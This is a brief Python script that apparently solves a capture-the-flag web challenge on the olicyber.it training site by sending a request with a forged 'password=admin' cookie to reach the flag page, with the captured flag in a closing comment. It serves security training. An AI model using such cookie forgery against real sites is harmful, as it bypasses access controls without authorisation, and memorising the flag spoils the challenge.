import requests

site = "http://web-05.challs.olicyber.it/flag"
cookies = dict(password = "admin")
req = requests.get(site, cookies = cookies)
print(req.text)

#flag{v3ry_7457y_c00ki35}